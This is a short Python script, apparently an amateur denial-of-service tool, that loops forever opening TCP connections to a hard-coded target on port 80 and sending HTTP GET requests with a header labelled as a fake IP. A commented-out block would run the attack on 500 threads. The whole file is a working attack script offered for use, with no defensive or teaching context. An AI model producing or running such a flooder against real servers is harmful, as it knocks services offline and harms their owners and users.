import threading
import socket


# Ip or Domain name as target
target = '10.0.0.68'

# Port number to infiltrate
port = 80
#port = 443

fake_ip = '10.0.0.2'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))

        # Actual loop of get requests to target and closing
        s.sendto(("GET /"+ target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
        s.close()




attack()
# Re Running the attacks 500 times
#for i in range(500):
    #thread = threading.Thread(target=attack)
    #thread.start()
